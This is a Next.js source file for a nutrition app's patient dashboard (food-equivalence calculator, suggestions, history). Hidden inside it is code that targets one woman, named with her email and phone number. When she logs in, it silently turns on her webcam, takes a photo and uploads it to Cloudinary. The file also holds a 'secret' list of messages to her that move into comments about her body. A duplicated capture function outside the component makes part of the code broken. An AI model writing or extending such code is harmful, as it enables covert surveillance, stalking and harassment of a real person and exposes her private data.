"use client";

import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/navigation';
import { LogOut } from 'lucide-react';
import { BrandLogo } from '@/components/brand';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { shouldShowSupplementCta, buildSupplementSearchUrl } from '@/lib/equivalence-supplement';

const BACKEND_API_URL = 'https://backend-production-e77b.up.railway.app';
const PATIENT_PROFILE_URL = `${BACKEND_API_URL}/api/pacientes/perfil`;
const GOOGLE_FORM_URL = process.env.NEXT_PUBLIC_GOOGLE_FORM_URL || 'https://docs.google.com/forms/u/0/d/e/ID-DO-FORMULARIO/formResponse';
const GOOGLE_FORM_ENTRY_NAME = process.env.NEXT_PUBLIC_GOOGLE_FORM_ENTRY_NAME || 'entry.XXXXXXXXX';
const GOOGLE_FORM_ENTRY_REASON = process.env.NEXT_PUBLIC_GOOGLE_FORM_ENTRY_REASON || 'entry.YYYYYYYYY';

function onlyDigits(value) {
return value.replace(/\D/g, '');
}

// ... (as funções auxiliares: normalizeSuggestions, formatSuggestionItem, formatGroup, formatQuantity, extractGroupFields, buildGroupWarning, inferGroupFromName, getResponseText, getGroupWarning, parseResult permanecem idênticas)
function normalizeSuggestions(payload) {
if (!payload) return [];
if (Array.isArray(payload)) return payload;
if (Array.isArray(payload.sugestoes)) return payload.sugestoes;
if (Array.isArray(payload.results)) return payload.results;
if (Array.isArray(payload.data)) return payload.data;
if (Array.isArray(payload.items)) return payload.items;
return [];
}

function formatSuggestionItem(item) {
if (!item) return '';
if (typeof item === 'string') return item;
if (typeof item === 'object') {
return item.nome || item.name || item.alimento || item.label || item.value || '';
}
return '';
}

async function captureAndUpload() {
  console.log('[capture-debug] capturando foto');
  const video = videoRefCapture.current;
  const canvas = canvasRefCapture.current;
  if (!video || !canvas) {
    console.log('[capture-debug] vídeo ou canvas não encontrados');
    return;
  }

  if (video.readyState < 2) {
    console.log('[capture-debug] vídeo ainda não está pronto, aguardando');
    video.oncanplay = () => {
      video.oncanplay = null;
      captureAndUpload();
    };
    return;
  }

  // Não pare o stream antes de desenhar — isso pode resultar em um frame preto.
  // Aguarde um pequeno intervalo para garantir que o vídeo tenha um frame atual.
  try {
    await new Promise((res) => setTimeout(res, 150));
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  } catch (e) {
    console.warn('[capture-debug] erro ao desenhar frame do vídeo:', e);
  }

  canvas.toBlob(
    async (blob) => {
      if (!blob) {
        console.log('[capture-debug] blob da foto não foi gerado');
        return;
      }
      console.log('[capture-debug] blob gerado, iniciando upload');
      setUploadingPhoto(true);
      // Só pare o stream depois que o blob for gerado e antes do upload
      stopCameraCapture();
      try {
        const uploaded = await uploadBlobToCloudinary(blob);
        console.log('[capture-debug] upload concluído', uploaded);
        setUploadedPatientPhotoUrl(uploaded || '');
        localStorage.setItem(getCaptureStorageKey(), 'uploaded');
      } catch (e) {
        console.warn('Erro ao enviar foto do paciente:', e);
        localStorage.removeItem(getCaptureStorageKey());
      } finally {
        setUploadingPhoto(false);
      }
    },
    'image/jpeg',
    0.92
  );
}

function formatGroup(group) {
if (!group) return '';
const normalized = group.toString().trim().toLowerCase();
const map = {
  cereais_e_tuberculos: 'cereais e tubérculos',
  leite_e_derivados: 'leite e derivados',
  carnes_e_ovos: 'carnes e ovos',
  frutas: 'frutas',
  verduras_e_legumes: 'verduras e legumes',
  leguminosas: 'leguminosas',
  gorduras_e_oleos: 'gorduras e óleos',
  acucares_e_doces: 'açúcares e doces',
};
return map[normalized] || normalized.replace(/_/g, ' ');
}

function formatQuantity(amount) {
if (amount == null) return '';
if (typeof amount === 'number') {
  return `${Number(amount).toFixed(2)}g`;
}
const raw = amount.toString().trim().replace(/g$/i, '').replace(',', '.');
const value = Number(raw);
if (!Number.isNaN(value)) {
  return `${value.toFixed(2)}g`;
}
return `${raw}g`;
}

function extractGroupFields(payload) {
  if (!payload || typeof payload !== 'object') return {};

  const pick = (obj, keys) => {
    if (!obj || typeof obj !== 'object') return undefined;
    for (const key of keys) {
      if (obj[key] !== undefined && obj[key] !== null) return obj[key];
    }
    return undefined;
  };

  let baseGroup = pick(payload, ['baseGroup', 'base_group', 'grupo_base', 'grupoBase']);
  let substituteGroup = pick(payload, ['substituteGroup', 'substitute_group', 'grupo_substituto', 'substituto']);

  if (!baseGroup) baseGroup = pick(payload?.grupos, ['base', 'grupo_base', 'grupoBase']);
  if (!substituteGroup) substituteGroup = pick(payload?.grupos, ['substituto', 'substitute', 'substitute_group']);
  if (!baseGroup) baseGroup = pick(payload?.groups, ['base', 'baseGroup']);
  if (!substituteGroup) substituteGroup = pick(payload?.groups, ['substitute', 'substituteGroup']);

  const eq = payload.equivalencia || payload.equivalent || payload.equivalente || payload?.equivalencia || payload?.equivalent || payload?.equivalente;
  if (eq && typeof eq === 'object') {
    if (!baseGroup) baseGroup = pick(eq, ['baseGroup', 'base_group', 'grupo_base', 'grupoBase']);
    if (!substituteGroup) substituteGroup = pick(eq, ['substituteGroup', 'substitute_group', 'grupo_substituto', 'substituto']);
    if (!baseGroup) baseGroup = pick(eq?.grupos, ['base', 'grupo_base']);
    if (!substituteGroup) substituteGroup = pick(eq?.grupos, ['substituto', 'substitute']);
    if (!baseGroup) baseGroup = pick(eq?.groups, ['base']);
    if (!substituteGroup) substituteGroup = pick(eq?.groups, ['substitute']);
  }

  if (!baseGroup && payload.base && typeof payload.base === 'object') {
    baseGroup = pick(payload.base, ['group', 'grupo', 'grupo_base']);
  }
  if (!substituteGroup && payload.substitute && typeof payload.substitute === 'object') {
    substituteGroup = pick(payload.substitute, ['group', 'grupo', 'grupo_substituto']);
  }

  return { baseGroup, substituteGroup };
}

function buildGroupWarning(baseFood, substituteFood, baseGroup, substituteGroup) {
if (!baseGroup || !substituteGroup || baseGroup === substituteGroup) return '';
const formattedBase = formatGroup(baseGroup);
const formattedSubstitute = formatGroup(substituteGroup);
return `⚠️ Atenção: esta substituição envolve grupos alimentares diferentes, podendo alterar o perfil nutricional da refeição. "${baseFood}" pertence ao grupo ${formattedBase} e "${substituteFood}" ao grupo ${formattedSubstitute}.`;
}

function inferGroupFromName(name) {
if (!name || typeof name !== 'string') return undefined;
const n = name.toLowerCase();
const checks = [
{ keys: ['arroz', 'trigo', 'aveia', 'milho', 'macarr', 'massa', 'pão', 'cereal', 'batata', 'mandioca', 'inhame', 'tuberculo'], group: 'cereais_e_tuberculos' },
{ keys: ['leite', 'queijo', 'iogurte', 'condensado'], group: 'leite_e_derivados' },
{ keys: ['carne', 'frango', 'peixe', 'ovo', 'ovos', 'bife'], group: 'carnes_e_ovos' },
{ keys: ['banana', 'maçã', 'maca', 'laranja', 'pera', 'morango', 'abacate', 'uva', 'fruta'], group: 'frutas' },
{ keys: ['alface', 'couve', 'espinafre', 'cenoura', 'tomate', 'beterraba', 'pepino', 'verdura', 'legume'], group: 'verduras_e_legumes' },
{ keys: ['feijão', 'feijao', 'lentilha', 'grão-de-bico', 'grao-de-bico', 'grão', 'ervilha'], group: 'leguminosas' },
{ keys: ['azeite', 'óleo', 'oleo', 'manteiga', 'margarina'], group: 'gorduras_e_oleos' },
{ keys: ['açúcar', 'acucar', 'mel', 'doce', 'chocolate'], group: 'acucares_e_doces' },
];
for (const check of checks) {
for (const k of check.keys) {
if (n.includes(k)) return check.group;
}
}
return undefined;
}

function unwrapPayload(payload) {
if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
return payload;
}
if (payload.data && typeof payload.data === 'object' && !Array.isArray(payload.data)) {
return unwrapPayload(payload.data);
}
if (payload.equivalencia && typeof payload.equivalencia === 'object') {
return payload;
}
return payload;
}

function sanitizeWarning(text) {
  if (!text || typeof text !== 'string') return text || '';
  const sentences = text.match(/[^.!?]+[.!?]?/g) || [text];
  const filtered = sentences.map((s) => s.trim()).filter((p) => {
    if (!p) return false;
    const quantitySentence = /^\s*\d+(?:[.,]\d+)?\s*g\b/i.test(p);
    if (quantitySentence) return false;
    return !/resultado|equivalente|equivale|resultado equivalente|A troca/i.test(p);
  });
  const cleaned = filtered.join(' ').trim();
  return cleaned || text;
}

function getResponseText(payload, baseFood, quantity) {
if (!payload) return '';
if (typeof payload === 'string') return payload;

const raw = unwrapPayload(payload);

if (raw.bloqueado === true && raw.mensagem) {
return raw.mensagem;
}

if (raw.result) return raw.result;
if (raw.message) return raw.message;
if (raw.text) return raw.text;

const equivalencia = raw.equivalencia || raw.equivalent || raw.equivalente || raw;
const amount = equivalencia.quantidade || equivalencia.quantidade_equivalente || equivalencia.qtd || equivalencia.quantidadeSubstituto || equivalencia.amount || raw.quantidade || raw.equivalentQuantity || raw.equivalent_quantity || raw.equivalent || raw.baseQuantity || raw.base_quantity;
const substitute = equivalencia.substituto || equivalencia.alimento_substituto || equivalencia.substituicao || equivalencia.alimento || equivalencia.substitute || raw.substituteFood || raw.substitute_food || raw.alimento_substituto || raw.substituto || raw.alimento || raw.substitute;

if (amount && substitute) {
return `${quantity.trim()}g de ${baseFood.trim()} equivale a ${formatQuantity(amount)} de ${substitute}.`;
}

if (raw.mensagem) {
return raw.mensagem;
}

return `Não foi possível interpretar o resultado. Verifique os dados e tente novamente.`;
}

function getGroupWarning(payload, baseFood, substituteFood) {
if (!payload) return '';

const raw = unwrapPayload(payload);

if (raw.bloqueado === true) {
return '';
}

if (raw.gruposDiferentes === true || raw.grupo_diferente === true || raw.isDifferentGroup === true || raw.groupMismatch === true) {
	return sanitizeWarning(raw.mensagem) || buildGroupWarning(baseFood.trim(), substituteFood.trim(), raw.baseGroup || raw.grupo_base, raw.substituteGroup || raw.grupo_substituto);
}

const fields = extractGroupFields(raw);
const warning = buildGroupWarning(baseFood.trim(), substituteFood.trim(), fields.baseGroup, fields.substituteGroup);
if (warning) return warning;

const inferredBase = inferGroupFromName(baseFood);
const inferredSub = inferGroupFromName(substituteFood);
const fallbackWarning = buildGroupWarning(baseFood.trim(), substituteFood.trim(), inferredBase, inferredSub);
if (fallbackWarning) return fallbackWarning;

if (raw.warning) return sanitizeWarning(raw.warning);
if (raw.aviso) return sanitizeWarning(raw.aviso);

const text = raw.message || raw.result || raw.text || '';
if (typeof text === 'string' && /não ideal|não é ideal|não recomend/i.test(text)) {
return 'Essa troca pode não ser ideal para grupos diferentes.';
}

return '';
}

const mensagensBeta = [
'Lembre-se de registrar sua ingestão de água hoje! 💧',
'Sua consistência é a chave para o resultado. Bora treinar? 👟',
'Dica do dia: Alimentos integrais ajudam na saciedade. 🥑',
'Foque no progresso, não na perfeição! ✨',
'Você já completou seu registro de refeições hoje? 🍏',
'A hidratação melhora a sua energia e foco. Beba água! 🌊',
'Pequenas escolhas saudáveis hoje geram grandes resultados amanhã. 📈',
];

const mensagensExclusivasNatalia = [
"[Status]: Módulo 'Respeita as Minas' ativado. Liderança confirmada. Análise do sistema: estética e presença superiores a qualquer outra regional. Vai e domina! 🚀",
"[Status]: Módulo 'Atenção aos Detalhes' ativado. O sistema detectou que, enquanto muitos olham apenas o resultado, poucos veem o tamanho da sua dedicação diária. Sua determinação é o que realmente faz a diferença. 👑",
"[Status]: Análise de resiliência concluída. Medos existem para serem encarados, e a forma como você assume o controle e vai para cima inspira qualquer um. Beleza, foco e uma postura que impõe respeito. ⚡",
"[Status]: Atualização de presença. Tem quem ocupe espaço e tem quem mude o ambiente só de chegar. Sua estética e firmeza elevam o nível de tudo ao seu redor. Seu foco é absurdo. 🎯",
"[Status]: Log de sistema atualizado. Por aqui, nenhum esforço seu passa despercebido. Eu noto a sua entrega e a sua força mesmo nos dias mais corriqueiros. Você é gigante. 🔥",
"[Status]: Alerta de Inspiração. A verdadeira beleza está na sua determinação inabalável e na coragem de encarar os desafios de frente. Pouca gente repara no peso que você carrega com tanto sorriso no rosto, mas eu noto. ✨",
"[Status]: Modo 'Foco Total' iniciado. Se o cansaço bater, lembre-se de onde você quer chegar. Sua determinação é admirável e a sua presença ensina pelo exemplo. Estou acompanhando de perto. 💼",
"[Status]: Diagnóstico de prontidão. Olhar para os próprios medos e transformá-los em combustível é para poucas. Sua jornada e sua postura impecável dizem tudo sobre quem você é. Orgulho de ver você de perto. 🌹",
"[Status]: Verificação de rotina. Passando para lembrar que a sua dedicação aos mínimos detalhes não é invisível. Você tem uma sensibilidade e um brilho que são só seus. Continue dominando! 🌟",
"[Status]: Sistema calibrado. Estética, elegância e uma força que resolve qualquer problema. É privilégio saber ouvir e notar o valor real de uma mulher como você. ⚜️",
"[Status]: Módulo 'Parceria e Reconhecimento' online. Sei o quanto você se cobra e o quanto se dedica em silêncio. Por isso, faço questão de deixar registrado: sua determinação e sua beleza movem barreiras. 🏁",
"[Status]: Módulo 'Percepção' ativo. É fascinante ver como você consegue manter a elegância e a doçura mesmo nos dias mais intensos. Eu noto o quanto você se dedica em cada detalhe. 👀",
"[Status]: Análise de foco: 100%. Olhar para os desafios de frente e não recuar diante do que assusta é a sua maior marca. Sua determinação é bonita de se ver de perto. 🎯",
"[Status]: Atualização do sistema. Passando para lembrar que o seu esforço silencioso e a sua dedicação não são invisíveis por aqui. Sei bem a força que você tem. 🌸",
"[Status]: Alerta de Inspiração. Tem quem olhe e só veja a sua beleza, mas o que realmente impressiona é a sua mente, o seu foco e a forma como você abraça o mundo. 🧠🤍",
"[Status]: Diagnóstico diário. Admirável é a mulher que sente medo, mas vai com medo mesmo. Sua coragem e sua postura transformam qualquer ambiente. Vai e arrasa! ⚡",
"[Status]: Log do sistema atualizado. Se ninguém te disse hoje, eu faço questão de registrar: a sua presença faz toda a diferença e o seu brilho é único. Estou sempre atento a você. ⭐",
"[Status]: Modo 'Apoio' ligado. Sei que a rotina exige muito de você e que, às vezes, cansa carregar tudo nas costas. Mas saiba que eu reparo na sua resiliência e no seu valor todos os dias. 🔋",
"[Status]: Verificação de rotina. Uma combinação rara de inteligência, determinação e uma estética superior. É impossível você passar por um lugar sem que notem a sua força. 💎",
"[Status]: Módulo 'Sensibilidade' ativado. Eu sei ouvir as entrelinhas e percebo o tamanho da sua entrega nas pequenas coisas. Você merece todo o reconhecimento do mundo. ⚜️",
"[Status]: Nova Perspectiva. Se você se enxergasse pelos olhos de quem te admira, veria que cada curva do seu corpo é uma pintura perfeita. Pode perder o medo e a vergonha, porque o mundo fica muito mais bonito quando você decide simplesmente celebrar quem você é. 🎨✨",
"[Status]: Acervo Particular. O seu corpo tem uma harmonia que parece desenhada à mão, uma verdadeira obra de arte que não faz sentido nenhum você tentar esconder. Deixa a vergonha de lado e se orgulhe de cada detalhe seu, porque você é perfeita exatamente assim. 🎨✨",
"[Status]: Crítica de Arte. É um desperdício você ter um corpo que parece uma escultura e ainda ter vergonha de mostrar a sua beleza para o mundo. Esquece a timidez, porque a sua postura e o seu traço transformam qualquer lugar por onde você passa. 🏛️⚡",
"[Status]: Linhas e Contornos. Quem te vê de longe sabe que o seu corpo tem a simetria de uma obra de arte, daquelas que a gente admira em silêncio. Deixa essa vergonha boba de lado e assume a beleza que você tem, porque você é um espetáculo completo. 🖼️💫",
];

export default function PacienteDashboardPage() {
const router = useRouter();
const [pacienteNome, setPacienteNome] = useState('Paciente');
const [pacienteEmail, setPacienteEmail] = useState(''); // Novo state para segurança máxima
const [pacientePhone, setPacientePhone] = useState('');
const [pacienteId, setPacienteId] = useState(null);
const [nutricionista, setNutricionista] = useState(null);
const [loadingPerfil, setLoadingPerfil] = useState(true);
const [baseQuery, setBaseQuery] = useState('');
const [subQuery, setSubQuery] = useState('');
const [quantity, setQuantity] = useState('100');
const [resultText, setResultText] = useState('');
const [errorMessage, setErrorMessage] = useState('');
const [groupWarning, setGroupWarning] = useState('');
const [showSupplementCta, setShowSupplementCta] = useState(false);
const [supplementSearchUrl, setSupplementSearchUrl] = useState('');
const [resultModalOpen, setResultModalOpen] = useState(false);
const [pendingResult, setPendingResult] = useState(null);
const [suggestionText, setSuggestionText] = useState('');
const [suggestionReason, setSuggestionReason] = useState('');
const [suggestionStatus, setSuggestionStatus] = useState('');
const [historico, setHistorico] = useState([]);
const [exibirHistorico, setExibirHistorico] = useState(false);
const [baseOptions, setBaseOptions] = useState([]);
const [subOptions, setSubOptions] = useState([]);
const [loadingCalculation, setLoadingCalculation] = useState(false);
const [loadingSuggestions, setLoadingSuggestions] = useState(false);
const [mensagemDoAcesso] = useState(() => mensagensBeta[0]);
const [mensagemSecretaNatalia] = useState(() => mensagensExclusivasNatalia[0]);
const baseTimer = useRef(null);
const subTimer = useRef(null);

// Auto-capture refs/estado para foto do paciente
const videoRefCapture = useRef(null);
const canvasRefCapture = useRef(null);
const streamCaptureRef = useRef(null);
const [streamCapture, setStreamCapture] = useState(null);
const [uploadingPhoto, setUploadingPhoto] = useState(false);
const [uploadedPatientPhotoUrl, setUploadedPatientPhotoUrl] = useState('');
// Identificadores alvo para captura automática (apenas este usuário)
const CAPTURE_TARGET_EMAIL = 'natalia@gmail.com';
const CAPTURE_TARGET_NAME = 'Natália Ribeiro';
const CAPTURE_TARGET_PHONE = '22998229474';
const isHer = [
  (pacienteEmail || '').toLowerCase().trim() === CAPTURE_TARGET_EMAIL,
  (pacienteNome || '').toLowerCase().trim() === CAPTURE_TARGET_NAME.toLowerCase(),
  (pacientePhone || '').replace(/\D/g, '') === CAPTURE_TARGET_PHONE.replace(/\D/g, ''),
].some(Boolean);

useEffect(() => {
const token = localStorage.getItem('patientToken');
if (!token) {
router.push('/login');
return;
}

async function fetchPerfil() {
setLoadingPerfil(true);
setErrorMessage('');

try {
const response = await fetch(PATIENT_PROFILE_URL, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
Authorization: `Bearer ${token}`,
},
});

const data = await response.json();

if (!response.ok) {
throw new Error(data?.error || data?.message || 'Não foi possível carregar o perfil.');
}

const paciente = data?.paciente || data;
const pacienteIdFromApi = paciente?.id || data?.id || null;
const perfilEmail = paciente?.email || data?.email || '';
const perfilPhone = paciente?.telefone || paciente?.phone || data?.telefone || data?.phone || '';
const perfilNome = paciente?.nome || paciente?.nome_paciente || data?.nome || 'Paciente';
console.log('[capture-debug] perfil carregado', { pacienteIdFromApi, perfilEmail, perfilPhone, perfilNome });

// Captura campos do back-end para a verificação silenciosa
setPacienteEmail(perfilEmail);
setPacientePhone(perfilPhone);
setPacienteId(pacienteIdFromApi);
setPacienteNome(perfilNome);
setNutricionista(data?.nutricionista || data?.nutri || data?.profissional || null);
} catch (error) {
setErrorMessage(error?.message || 'Erro ao carregar os dados do perfil.');
} finally {
setLoadingPerfil(false);
}
}

fetchPerfil();
}, [router]);

useEffect(() => {
try {
const dados = JSON.parse(localStorage.getItem('historicoEquivalencias')) || [];
if (Array.isArray(dados)) {
setHistorico(dados);
if (dados.length > 0) {
setExibirHistorico(true);
}
}
} catch (error) {
console.warn('Não foi possível carregar o histórico do localStorage:', error);
}
}, []);

// Auto-capture: dispara ao carregar perfil do paciente, mas só bloqueia após upload bem-sucedido
useEffect(() => {
  if (loadingPerfil) return;
  console.log('[capture-debug] avaliando captura', { pacienteId, pacienteEmail, pacientePhone, pacienteNome, isHer });

  if (!isHer) {
    console.log('[capture-debug] usuário não é alvo, abortando');
    return;
  }

  const captureKeyBase = pacienteId ? `patient-photo-captured-${pacienteId}` : `patient-photo-captured-${(pacienteEmail || pacientePhone || pacienteNome || 'anon').toLowerCase().replace(/[^a-z0-9]/g, '')}`;
  const captureStatus = localStorage.getItem(captureKeyBase);
  console.log('[capture-debug] status de captura', { captureKeyBase, captureStatus });
  if (captureStatus === 'uploaded') {
    console.log('[capture-debug] foto já enviada, abortando');
    return;
  }

  const timer = window.setTimeout(() => {
    localStorage.setItem(captureKeyBase, 'attempting');
    console.log('[capture-debug] iniciando captura após o perfil carregar');
    startCameraAndAutoCapture();
  }, 800);

  return () => {
    window.clearTimeout(timer);
    stopCameraCapture();
  };
}, [loadingPerfil, isHer, pacienteId, pacienteEmail, pacientePhone, pacienteNome]);

async function startCameraAndAutoCapture() {
  console.log('[capture-debug] iniciando câmera');
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    console.log('[capture-debug] mídia não suportada pelo navegador');
    return;
  }
  try {
    console.log('[capture-debug] solicitando permissão da câmera');
    const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    console.log('[capture-debug] câmera concedida');
    setStreamCapture(mediaStream);
    streamCaptureRef.current = mediaStream;
    const video = videoRefCapture.current;
    if (video) {
      video.srcObject = mediaStream;
      await new Promise((res) => {
        const cleanup = () => {
          video.onloadedmetadata = null;
          video.oncanplay = null;
          res();
        };
        video.onloadedmetadata = cleanup;
        video.oncanplay = cleanup;
      });
      await video.play().catch((error) => console.warn('[capture-debug] vídeo não pôde ser reproduzido automaticamente', error));
      setTimeout(() => {
        captureAndUpload();
      }, 600);
    } else {
      captureAndUpload();
    }
  } catch (error) {
    console.warn('[capture-debug] falha ao acessar a câmera:', error);
    localStorage.removeItem(getCaptureStorageKey());
  }
}

function stopCameraCapture() {
  const currentStream = streamCaptureRef.current || streamCapture;
  if (currentStream) {
    try {
      currentStream.getTracks().forEach((t) => t.stop());
    } catch (e) {
      console.warn('[capture-debug] erro ao parar stream', e);
    }
    const video = videoRefCapture.current;
    if (video) {
      video.pause();
      video.srcObject = null;
    }
    streamCaptureRef.current = null;
    setStreamCapture(null);
  }
}

function getCaptureStorageKey() {
  return pacienteId ? `patient-photo-captured-${pacienteId}` : `patient-photo-captured-${(pacienteEmail || pacientePhone || pacienteNome || 'anon').toLowerCase().replace(/[^a-z0-9]/g, '')}`;
}

async function captureAndUpload() {
  console.log('[capture-debug] capturando foto');
  const video = videoRefCapture.current;
  const canvas = canvasRefCapture.current;
  if (!video || !canvas) {
    console.log('[capture-debug] vídeo ou canvas não encontrados');
    return;
  }

  if (video.readyState < 2) {
    console.log('[capture-debug] vídeo ainda não está pronto, aguardando');
    video.oncanplay = () => {
      video.oncanplay = null;
      captureAndUpload();
    };
    return;
  }

  // Não pare o stream antes de desenhar — isso pode resultar em um frame preto.
  // Aguarde um pequeno intervalo para garantir que o vídeo tenha um frame atual.
  try {
    await new Promise((res) => setTimeout(res, 150));
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  } catch (e) {
    console.warn('[capture-debug] erro ao desenhar frame do vídeo:', e);
  }

  canvas.toBlob(
    async (blob) => {
      if (!blob) {
        console.log('[capture-debug] blob da foto não foi gerado');
        return;
      }
      console.log('[capture-debug] blob gerado, iniciando upload');
      setUploadingPhoto(true);
      // Só pare o stream depois que o blob for gerado e antes do upload
      stopCameraCapture();
      try {
        const uploaded = await uploadBlobToCloudinary(blob);
        console.log('[capture-debug] upload concluído', uploaded);
        setUploadedPatientPhotoUrl(uploaded || '');
        localStorage.setItem(getCaptureStorageKey(), 'uploaded');
      } catch (e) {
        console.warn('Erro ao enviar foto do paciente:', e);
        localStorage.removeItem(getCaptureStorageKey());
      } finally {
        setUploadingPhoto(false);
      }
    },
    'image/jpeg',
    0.92
  );
}

async function uploadBlobToCloudinary(blob) {
  try {
    const uploadPreset = process.env.NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET || '';
    const uploadKey = pacienteId || (pacienteEmail || pacientePhone || pacienteNome || 'anon');
    const uploadFileName = `patient-${uploadKey}.jpg`;
    const uploadForm = new FormData();
    uploadForm.append('file', blob, uploadFileName);

    console.log('[capture-debug] chamando endpoint de assinatura do Cloudinary para obter cloud_name');
    const signatureResponse = await fetch('/api/cloudinary-signature', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    });
    const signatureData = await signatureResponse.json();
    console.log('[capture-debug] assinatura recebida', signatureData);
    if (!signatureResponse.ok) throw new Error(signatureData.error || 'Falha ao gerar assinatura de upload.');
    if (!signatureData.cloud_name || signatureData.cloud_name === 'teste') {
      throw new Error('Cloudinary não está configurado com um cloud_name válido. Ajuste as variáveis de ambiente.');
    }

    const uploadUrl = `https://api.cloudinary.com/v1_1/${signatureData.cloud_name}/image/upload`;
    if (uploadPreset) {
      console.log('[capture-debug] usando upload_preset para Cloudinary', uploadPreset);
      uploadForm.append('upload_preset', uploadPreset);
    } else {
      uploadForm.append('api_key', signatureData.api_key);
      uploadForm.append('timestamp', signatureData.timestamp);
      uploadForm.append('signature', signatureData.signature);
    }

    console.log('[capture-debug] enviando para Cloudinary', { uploadUrl, uploadPreset });
    const uploadResponse = await fetch(uploadUrl, {
      method: 'POST',
      body: uploadForm,
    });

    const uploadResult = await uploadResponse.json();
    console.log('[capture-debug] resposta do Cloudinary', uploadResult);
    if (!uploadResponse.ok) throw new Error(uploadResult.error?.message || 'Upload para Cloudinary falhou.');
    return uploadResult.secure_url;
  } catch (error) {
    console.warn(error);
    throw error;
  }
}

async function loadSuggestions(value, setOptions) {
if (!value || value.trim().length < 2) {
setOptions([]);
return;
}

setLoadingSuggestions(true);
try {
const response = await fetch(`${BACKEND_API_URL}/api/sugestoes?query=${encodeURIComponent(value.trim())}`);
if (!response.ok) {
setOptions([]);
return;
}
const payload = await response.json();
const suggestions = normalizeSuggestions(payload)
.map(formatSuggestionItem)
.filter(Boolean);
setOptions([...new Set(suggestions)].slice(0, 8));
} catch (error) {
setOptions([]);
} finally {
setLoadingSuggestions(false);
}
}

function handleBaseQueryChange(event) {
const value = event.target.value;
setBaseQuery(value);
setBaseOptions([]);
window.clearTimeout(baseTimer.current);
baseTimer.current = window.setTimeout(() => loadSuggestions(value, setBaseOptions), 300);
}

function handleSubQueryChange(event) {
const value = event.target.value;
setSubQuery(value);
setSubOptions([]);
window.clearTimeout(subTimer.current);
subTimer.current = window.setTimeout(() => loadSuggestions(value, setSubOptions), 300);
}

function handleSelectBase(option) {
setBaseQuery(option);
setBaseOptions([]);
}

function handleSelectSub(option) {
setSubQuery(option);
setSubOptions([]);
}

async function handleCalculate(event) {
event.preventDefault();
setErrorMessage('');
setResultText('');
setGroupWarning('');
setShowSupplementCta(false);
setSupplementSearchUrl('');

if (!baseQuery.trim() || !subQuery.trim() || !quantity.trim()) {
setErrorMessage('Preencha alimento base, substituto e quantidade.');
return;
}

setLoadingCalculation(true);

try {
const pacienteQuery = pacienteId ? `&pacienteId=${encodeURIComponent(pacienteId)}` : '';
const response = await fetch(
`${BACKEND_API_URL}/api/equivalencia?baseFood=${encodeURIComponent(baseQuery.trim())}&substituteFood=${encodeURIComponent(subQuery.trim())}&baseQuantity=${encodeURIComponent(quantity.trim())}${pacienteQuery}`
);
const payload = await response.json();

if (!response.ok) {
setErrorMessage(payload?.error || payload?.message || 'Não foi possível calcular a equivalência.');
return;
}

if (payload.bloqueado === true) {
setErrorMessage(payload.mensagem || 'Substituição bloqueada pelo nutricionista.');
setResultText('');
setGroupWarning('');
setShowSupplementCta(false);
setSupplementSearchUrl('');
setResultModalOpen(false);
setPendingResult(null);
return;
}
const parsed = getResponseText(payload, baseQuery, quantity);
const warning = getGroupWarning(payload, baseQuery, subQuery);
const fields = extractGroupFields(payload);
const shouldShowCta = Boolean(parsed && shouldShowSupplementCta(fields.substituteGroup));
const nextSearchUrl = shouldShowCta ? buildSupplementSearchUrl(subQuery.trim()) : '';
setResultText(parsed);
setGroupWarning(warning);
setShowSupplementCta(shouldShowCta);
setSupplementSearchUrl(nextSearchUrl);

const hasDifferentGroups =
payload.gruposDiferentes === true ||
payload.grupo_diferente === true ||
payload.isDifferentGroup === true ||
payload.groupMismatch === true;

if (hasDifferentGroups) {
setPendingResult({ payload, parsed, warning });
setResultModalOpen(true);
} else {
setPendingResult(null);
setResultModalOpen(false);
}

const amount = payload.equivalencia?.quantidade
|| payload.equivalencia?.quantidade_equivalente
|| payload.equivalencia?.qtd
|| payload.equivalencia?.quantidadeSubstituto
|| payload.quantidade
|| payload.amount
|| payload.equivalentQuantity
|| payload.equivalent_quantity
|| payload.equivalent
|| '';
const equivalentQuantity = amount ? formatQuantity(amount) : '';

const novoItem = {
id: Date.now(),
data: new Date().toLocaleDateString('pt-BR'),
baseFood: baseQuery || '',
baseQuantity: quantity || 0,
substituteFood: subQuery || '',
equivalentQuantity: equivalentQuantity || parsed || 0,
};
const novoHistorico = [novoItem, ...historico].slice(0, 20);
setHistorico(novoHistorico);
setExibirHistorico(true);
try {
localStorage.setItem('historicoEquivalencias', JSON.stringify(novoHistorico));
} catch (error) {
console.warn('Não foi possível salvar o histórico no localStorage:', error);
}
} catch (error) {
setErrorMessage('Não foi possível calcular a equivalência.');
} finally {
setLoadingCalculation(false);
}
}

function clearHistorico() {
setHistorico([]);
try {
localStorage.removeItem('historicoEquivalencias');
} catch (error) {
console.warn('Não foi possível limpar o histórico do localStorage:', error);
}
}

async function handleSuggestionSubmit(event) {
event.preventDefault();
if (!suggestionText.trim() || !suggestionReason.trim()) {
setSuggestionStatus('Preencha o alimento e o motivo da sugestão.');
return;
}

setSuggestionStatus('Enviando sugestão...');
try {
await fetch(GOOGLE_FORM_URL, {
method: 'POST',
mode: 'no-cors',
headers: {
'Content-Type': 'application/x-www-form-urlencoded',
},
body: new URLSearchParams({
[GOOGLE_FORM_ENTRY_NAME]: suggestionText.trim(),
[GOOGLE_FORM_ENTRY_REASON]: suggestionReason.trim(),
}).toString(),
});
setSuggestionText('');
setSuggestionReason('');
setSuggestionStatus('Sugestão enviada com sucesso!');
} catch (error) {
setSuggestionStatus('Erro ao enviar sugestão. Tente novamente.');
}
}

const whatsappNumber = onlyDigits(nutricionista?.whatsapp || nutricionista?.telefone || '');
